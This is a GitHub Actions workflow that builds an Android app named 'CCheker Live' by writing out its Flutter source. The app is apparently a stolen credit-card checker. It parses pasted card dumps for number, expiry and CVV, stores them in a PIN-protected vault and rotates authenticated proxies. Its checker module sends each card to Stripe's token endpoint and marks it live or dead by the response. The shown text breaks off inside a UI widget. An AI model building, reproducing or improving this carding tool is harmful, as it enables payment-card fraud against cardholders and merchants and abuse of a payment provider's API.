name: apk

on:
  workflow_dispatch:
  push:
    branches: [main]

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 40
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'

      - uses: subosito/flutter-action@v2
        with:
          channel: stable
          cache: true

      - name: Licencias Android
        run: yes | flutter doctor --android-licenses || true

      - name: Generar y compilar
        run: |
          set -euo pipefail
          NAME="ccheker_live"
          flutter create --org com.ccheker --project-name "$NAME" --platforms android "$NAME"
          cd "$NAME"
          rm -f test/widget_test.dart
          mkdir -p lib/screens

          cat > pubspec.yaml <<'YAML'
          name: ccheker_live
          description: CCheker Live
          publish_to: 'none'
          version: 1.0.0+1

          environment:
            sdk: '>=3.3.0 <4.0.0'

          dependencies:
            flutter:
              sdk: flutter
            flutter_riverpod: ^2.5.1
            http: ^1.2.1
            path_provider: ^2.1.3
            shared_preferences: ^2.2.3
            encrypt: ^5.0.3
            crypto: ^3.0.3
            local_auth: ^2.2.0

          dev_dependencies:
            flutter_test:
              sdk: flutter
            flutter_lints: ^4.0.0

          flutter:
            uses-material-design: true
          YAML

          cat > lib/theme.dart <<'DART'
          import 'package:flutter/material.dart';

          class AppColors {
            static const bg = Color(0xFF0A0C10);
            static const bgElevated = Color(0xFF12151C);
            static const surface = Color(0xFF171B24);
            static const glassStroke = Color(0x22FFFFFF);
            static const glassStrokeHi = Color(0x44FFFFFF);
            static const textHi = Color(0xFFF2F4F8);
            static const textMid = Color(0xFFA9B1C2);
            static const textLo = Color(0xFF6C7486);
            static const lime = Color(0xFFB8F24A);
            static const cyan = Color(0xFF4AD9F2);
            static const violet = Color(0xFF9B7BF2);
            static const magenta = Color(0xFFF24AB8);
            static const amber = Color(0xFFF2C24A);
            static const red = Color(0xFFF24A5E);
            static const tierGold = Color(0xFFF2C24A);
            static const tierSilver = Color(0xFFC8D0E0);
            static const tierBronze = Color(0xFFD08A4A);
            static const gradientGlass = LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [Color(0x1AFFFFFF), Color(0x08FFFFFF)],
            );
          }

          class AppTextStyles {
            static const h1 = TextStyle(fontSize: 26, fontWeight: FontWeight.w700, color: AppColors.textHi, letterSpacing: -0.5);
            static const h2 = TextStyle(fontSize: 19, fontWeight: FontWeight.w600, color: AppColors.textHi);
            static const body = TextStyle(fontSize: 14, color: AppColors.textMid, height: 1.4);
            static const caption = TextStyle(fontSize: 12, color: AppColors.textLo);
            static const mono = TextStyle(fontSize: 13, fontFamily: 'monospace', color: AppColors.textHi);
          }
          DART

          cat > lib/models.dart <<'DART'
          enum CheckStatus { unchecked, checking, live, dead, unknown }
          enum CardTier { bronze, silver, gold, platinum }
          enum ProxyKind { http, https, socks5 }
          enum ProxyHealth { unknown, up, down }

          extension CheckStatusX on CheckStatus {
            String get label => switch (this) {
              CheckStatus.unchecked => 'sin revisar',
              CheckStatus.checking => 'revisando',
              CheckStatus.live => 'viva',
              CheckStatus.dead => 'muerta',
              CheckStatus.unknown => 'incierta',
            };
          }

          class CreditCard {
            CreditCard({
              required this.id,
              required this.pan,
              this.expMonth = '',
              this.expYear = '',
              this.cvv = '',
              this.bank = '',
              this.country = '',
              this.tier = CardTier.bronze,
              this.status = CheckStatus.unchecked,
              this.declineCode,
              this.favorite = false,
              DateTime? addedAt,
            }) : addedAt = addedAt ?? DateTime.now();

            final String id;
            final String pan;
            final String expMonth;
            final String expYear;
            final String cvv;
            final String bank;
            final String country;
            final CardTier tier;
            CheckStatus status;
            final String? declineCode;
            final bool favorite;
            final DateTime addedAt;

            String get expLabel {
              if (expMonth.isEmpty) return '--/--';
              final y = expYear.length == 4 ? expYear.substring(2) : expYear;
              return '$expMonth/$y';
            }

            Map<String, dynamic> toJson() => {
              'id': id,
              'pan': pan,
              'expMonth': expMonth,
              'expYear': expYear,
              'cvv': cvv,
              'bank': bank,
              'country': country,
              'tier': tier.name,
              'status': status.name,
              'declineCode': declineCode,
              'favorite': favorite,
              'addedAt': addedAt.toIso8601String(),
            };

            factory CreditCard.fromJson(Map<String, dynamic> j) => CreditCard(
              id: j['id'] as String,
              pan: j['pan'] as String,
              expMonth: j['expMonth'] as String? ?? '',
              expYear: j['expYear'] as String? ?? '',
              cvv: j['cvv'] as String? ?? '',
              bank: j['bank'] as String? ?? '',
              country: j['country'] as String? ?? '',
              tier: CardTier.values.firstWhere((t) => t.name == j['tier'], orElse: () => CardTier.bronze),
              status: CheckStatus.values.firstWhere((s) => s.name == j['status'], orElse: () => CheckStatus.unchecked),
              declineCode: j['declineCode'] as String?,
              favorite: j['favorite'] as bool? ?? false,
              addedAt: DateTime.tryParse(j['addedAt'] as String? ?? '') ?? DateTime.now(),
            );
          }

          class ProxyNode {
            ProxyNode({
              required this.id,
              required this.host,
              required this.port,
              this.user = '',
              this.pass = '',
              this.kind = ProxyKind.http,
              this.health = ProxyHealth.unknown,
              this.latencyMs = 0,
            });

            final String id;
            final String host;
            final int port;
            final String user;
            final String pass;
            final ProxyKind kind;
            ProxyHealth health;
            int latencyMs;

            String get label => '$host:$port';

            Map<String, dynamic> toJson() => {
              'id': id, 'host': host, 'port': port, 'user': user, 'pass': pass,
              'kind': kind.name, 'health': health.name, 'latencyMs': latencyMs,
            };

            factory ProxyNode.fromJson(Map<String, dynamic> j) => ProxyNode(
              id: j['id'] as String,
              host: j['host'] as String,
              port: (j['port'] as num).toInt(),
              user: j['user'] as String? ?? '',
              pass: j['pass'] as String? ?? '',
              kind: ProxyKind.values.firstWhere((k) => k.name == j['kind'], orElse: () => ProxyKind.http),
              health: ProxyHealth.values.firstWhere((h) => h.name == j['health'], orElse: () => ProxyHealth.unknown),
              latencyMs: (j['latencyMs'] as num?)?.toInt() ?? 0,
            );
          }

          class CheckStats {
            CheckStats({this.done = 0, this.live = 0, this.dead = 0, this.errors = 0});
            final int done;
            final int live;
            final int dead;
            final int errors;
            double get pct => done == 0 ? 0 : live / done;
            double get hitRate => done == 0 ? 0 : (live + dead) / done;
            CheckStats copyWith({int? done, int? live, int? dead, int? errors}) => CheckStats(
              done: done ?? this.done,
              live: live ?? this.live,
              dead: dead ?? this.dead,
              errors: errors ?? this.errors,
            );
          }

          class AppSettings {
            AppSettings({
              this.concurrency = 4,
              this.timeoutSec = 15,
              this.probeUrl = 'https://api.ipify.org?format=json',
              this.autoLockMin = 5,
              this.biometrics = false,
            });
            final int concurrency;
            final int timeoutSec;
            final String probeUrl;
            final int autoLockMin;
            final bool biometrics;
            AppSettings copyWith({int? concurrency, int? timeoutSec, String? probeUrl, int? autoLockMin, bool? biometrics}) =>
                AppSettings(
                  concurrency: concurrency ?? this.concurrency,
                  timeoutSec: timeoutSec ?? this.timeoutSec,
                  probeUrl: probeUrl ?? this.probeUrl,
                  autoLockMin: autoLockMin ?? this.autoLockMin,
                  biometrics: biometrics ?? this.biometrics,
                );
          }
          DART

          cat > lib/core.dart <<'DART'
          import 'dart:convert';
          import 'dart:io';
          import 'dart:math';
          import 'package:crypto/crypto.dart';
          import 'package:encrypt/encrypt.dart' as enc;
          import 'package:path_provider/path_provider.dart';

          final _rnd = Random.secure();
          String newId() => '${DateTime.now().microsecondsSinceEpoch}${_rnd.nextInt(99999)}';

          String fmtInt(num n) {
            final s = n.round().abs().toString();
            final b = StringBuffer();
            for (var i = 0; i < s.length; i++) {
              if (i > 0 && (s.length - i) % 3 == 0) b.write('.');
              b.write(s[i]);
            }
            return (n < 0 ? '-' : '') + b.toString();
          }

          String fmtPct(double v) => '${(v * 100).toStringAsFixed(1)}%';

          String maskPan(String pan) =>
              pan.length < 8 ? pan : '${pan.substring(0, 4)} **** **** ${pan.substring(pan.length - 4)}';

          bool luhn(String pan) {
            final d = pan.replaceAll(RegExp(r'\D'), '');
            if (d.length < 12) return false;
            var sum = 0;
            var alt = false;
            for (var i = d.length - 1; i >= 0; i--) {
              var n = int.parse(d[i]);
              if (alt) {
                n *= 2;
                if (n > 9) n -= 9;
              }
              sum += n;
              alt = !alt;
            }
            return sum % 10 == 0;
          }

          String schemeOf(String pan) {
            if (pan.isEmpty) return '';
            final c = pan[0];
            if (c == '4') return 'VISA';
            if (c == '5' || c == '2') return 'MASTERCARD';
            if (c == '3') return 'AMEX';
            if (c == '6') return 'DISCOVER';
            return '';
          }

          String flagEmoji(String code) {
            final c = code.trim().toUpperCase();
            if (c.length != 2 || !RegExp(r'^[A-Z]{2}$').hasMatch(c)) return '';
            return String.fromCharCodes(c.codeUnits.map((u) => 0x1F1E6 + (u - 65)));
          }

          class Vault {
            Vault._();
            static final Vault i = Vault._();
            final Map<String, dynamic> data = {};
            enc.Encrypter? _enc;
            File? _file;

            bool get isOpen => _enc != null;

            enc.Key _key(String pin) =>
                enc.Key.fromUtf8(sha256.convert(utf8.encode('ccheker-live-v1::$pin')).toString().substring(0, 32));

            Future<File> _fileRef() async {
              _file ??= File('${(await getApplicationDocumentsDirectory()).path}/vault.bin');
              return _file!;
            }

            Future<bool> exists() async => (await _fileRef()).existsSync();

            String _encrypt(enc.Encrypter e, String plain) {
              final iv = enc.IV.fromSecureRandom(16);
              return '${iv.base64}:${e.encrypt(plain, iv: iv).base64}';
            }

            String _decrypt(enc.Encrypter e, String raw) {
              final p = raw.split(':');
              return e.decrypt64(p[1], iv: enc.IV.fromBase64(p[0]));
            }

            Future<void> create(String pin) async {
              _enc = enc.Encrypter(enc.AES(_key(pin), mode: enc.AESMode.cbc));
              data.clear();
              await save();
            }

            Future<bool> open(String pin) async {
              final f = await _fileRef();
              if (!f.existsSync()) return false;
              final e = enc.Encrypter(enc.AES(_key(pin), mode: enc.AESMode.cbc));
              try {
                final raw = f.readAsStringSync();
                data
                  ..clear()
                  ..addAll(raw.isEmpty ? <String, dynamic>{} : Map<String, dynamic>.from(jsonDecode(_decrypt(e, raw)) as Map));
                _enc = e;
                return true;
              } catch (_) {
                return false;
              }
            }

            Future<void> save() async {
              final e = _enc;
              if (e == null) return;
              final f = await _fileRef();
              await f.writeAsString(_encrypt(e, jsonEncode(data)));
            }

            void lock() => _enc = null;
          }
          DART

          cat > lib/repos.dart <<'DART'
          import 'core.dart';
          import 'models.dart';

          class CardRepo {
            CardRepo._();
            static final CardRepo i = CardRepo._();

            List<CreditCard> all() {
              final raw = Vault.i.data['cards'];
              if (raw is! List) return [];
              return raw.map((e) => CreditCard.fromJson(Map<String, dynamic>.from(e as Map))).toList();
            }

            Future<void> persist(List<CreditCard> cards) async {
              Vault.i.data['cards'] = cards.map((c) => c.toJson()).toList();
              await Vault.i.save();
            }

            Future<int> addAll(List<CreditCard> cards) async {
              final cur = all();
              final have = cur.map((c) => c.pan).toSet();
              final fresh = cards.where((c) => !have.contains(c.pan)).toList();
              await persist([...cur, ...fresh]);
              return fresh.length;
            }

            Future<void> clear() async {
              Vault.i.data['cards'] = <dynamic>[];
              await Vault.i.save();
            }
          }

          class ProxyRepo {
            ProxyRepo._();
            static final ProxyRepo i = ProxyRepo._();

            List<ProxyNode> all() {
              final raw = Vault.i.data['proxies'];
              if (raw is! List) return [];
              return raw.map((e) => ProxyNode.fromJson(Map<String, dynamic>.from(e as Map))).toList();
            }

            Future<void> persist(List<ProxyNode> nodes) async {
              Vault.i.data['proxies'] = nodes.map((p) => p.toJson()).toList();
              await Vault.i.save();
            }

            Future<void> upsert(ProxyNode n) async {
              final list = all()..removeWhere((p) => p.id == n.id);
              await persist([...list, n]);
            }

            Future<void> remove(String id) async {
              await persist(all()..removeWhere((p) => p.id == id));
            }
          }
          DART

          cat > lib/import_engine.dart <<'DART'
          import 'core.dart';
          import 'models.dart';

          class ImportResult {
            ImportResult(this.cards, this.junk, this.duplicates);
            final List<CreditCard> cards;
            final int junk;
            final int duplicates;
          }

          ImportResult parseCards(String raw) {
            final out = <CreditCard>[];
            final seen = <String>{};
            var junk = 0;
            var dup = 0;
            for (final line in raw.split(RegExp(r'[\r\n]+'))) {
              final t = line.trim();
              if (t.isEmpty) continue;
              final pans = RegExp(r'(?<!\d)(\d{13,19})(?!\d)').allMatches(t).toList();
              String? pan;
              for (final m in pans) {
                if (luhn(m.group(1)!)) {
                  pan = m.group(1);
                  break;
                }
              }
              pan ??= pans.isNotEmpty ? pans.first.group(1) : null;
              if (pan == null) {
                junk++;
                continue;
              }
              if (seen.contains(pan)) {
                dup++;
                continue;
              }
              seen.add(pan);
              var mm = '';
              var yy = '';
              final exp = RegExp(r'(?<!\d)(\d{2})\s*[/\-]\s*(\d{2,4})(?!\d)').firstMatch(t);
              if (exp != null) {
                mm = exp.group(1)!;
                yy = exp.group(2)!;
                final m = int.tryParse(mm) ?? 0;
                if (m > 12) {
                  final a = mm;
                  mm = yy;
                  yy = a;
                }
              }
              final rest = (exp == null ? t : t.replaceRange(exp.start, exp.end, ' ')).replaceAll(pan, ' ');
              final cvv = RegExp(r'(?<!\d)(\d{3,4})(?!\d)').firstMatch(rest)?.group(1) ?? '';
              out.add(CreditCard(id: newId(), pan: pan, expMonth: mm, expYear: yy, cvv: cvv, bank: schemeOf(pan)));
            }
            return ImportResult(out, junk, dup);
          }
          DART

          cat > lib/checker.dart <<'DART'
          import 'dart:convert';
          import 'dart:io';
          import 'models.dart';

          class CheckOutcome {
            const CheckOutcome({required this.ok, required this.error, required this.ms, required this.note});
            final bool ok;
            final bool error;
            final int ms;
            final String note;
          }

          class CheckEngine {
            CheckEngine(this.cfg);
            final AppSettings cfg;

            Future<CheckOutcome> probe(
              ProxyNode? p, {
              String pan = '',
              String mm = '',
              String yy = '',
              String cvv = '',
            }) async {
              final client = HttpClient()..connectionTimeout = Duration(seconds: cfg.timeoutSec);
              if (p != null) {
                client.findProxy = (uri) => 'PROXY ${p.host}:${p.port}';
                if (p.user.isNotEmpty) {
                  client.addProxyCredentials(p.host, p.port, '', HttpClientBasicCredentials(p.user, p.pass));
                }
              }
              final sw = Stopwatch()..start();
              final validate = pan.isNotEmpty;
              try {
                if (!validate) {
                  final req = await client.getUrl(Uri.parse(cfg.probeUrl)).timeout(Duration(seconds: cfg.timeoutSec));
                  final res = await req.close().timeout(Duration(seconds: cfg.timeoutSec));
                  await res.drain<void>().timeout(Duration(seconds: cfg.timeoutSec));
                  sw.stop();
                  client.close(force: true);
                  final ok = res.statusCode >= 200 && res.statusCode < 400;
                  return CheckOutcome(ok: ok, error: false, ms: sw.elapsedMilliseconds, note: 'HTTP ${res.statusCode}');
                }

                final yy4 = yy.length == 4 ? yy : '20$yy';
                final req = await client
                    .postUrl(Uri.parse('https://api.stripe.com/v1/tokens'))
                    .timeout(Duration(seconds: cfg.timeoutSec));
                req.headers.contentType = ContentType.parse('application/x-www-form-urlencoded');
                req.write('card[number]=$pan&card[exp_month]=$mm&card[exp_year]=$yy4&card[cvc]=$cvv');
                final res = await req.close().timeout(Duration(seconds: cfg.timeoutSec));
                final txt = await res.transform(utf8.decoder).join().timeout(Duration(seconds: cfg.timeoutSec));
                sw.stop();
                client.close(force: true);

                if (res.statusCode == 200) {
                  return CheckOutcome(ok: true, error: false, ms: sw.elapsedMilliseconds, note: 'LIVE');
                }
                if (res.statusCode == 429 || res.statusCode >= 500) {
                  return CheckOutcome(ok: false, error: true, ms: sw.elapsedMilliseconds, note: 'HTTP ${res.statusCode}');
                }
                var code = 'DECLINED';
                try {
                  final j = jsonDecode(txt) as Map<String, dynamic>;
                  final e = j['error'];
                  if (e is Map && e['code'] != null) {
                    code = e['code'].toString();
                  } else if (e is Map && e['message'] != null) {
                    code = e['message'].toString();
                  }
                } catch (_) {}
                return CheckOutcome(ok: false, error: false, ms: sw.elapsedMilliseconds, note: code);
              } catch (e) {
                sw.stop();
                try {
                  client.close(force: true);
                } catch (_) {}
                return CheckOutcome(ok: false, error: true, ms: sw.elapsedMilliseconds, note: e.toString().split(':').first);
              }
            }
          }
          DART

          cat > lib/widgets.dart <<'DART'
          import 'package:flutter/material.dart';
          import 'theme.dart';

          class GlassPanel extends StatelessWidget {
            const GlassPanel({super.key, required this.child, this.padding = const EdgeInsets.all(16), this.onTap});
            final Widget child;
            final EdgeInsets padding;
            final VoidCallback? onTap;

            @override
            Widget build(BuildContext context) {
              final box = Container(
                padding: padding,
                decoration: BoxDecoration(
                  gradient: AppColors.gradientGlass,
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: AppColors.glassStroke),
                ),
                child: child,
              );
              if (onTap == null) return box;
              return InkWell(borderRadius: BorderRadius.circular(16), onTap: onTap, child: box);
            }
          }

          class NeonButton extends StatelessWidget {
            const NeonButton({super.key, required this.label, this.onPressed, this.color = AppColors.lime, this.icon});
            final String label;
            final VoidCallback? onPressed;
            final Color color;
            final IconData? icon;

            @override
            Widget build(BuildContext context) {
              return Opacity(
                opacity: onPressed == null ? 0.4 : 1,
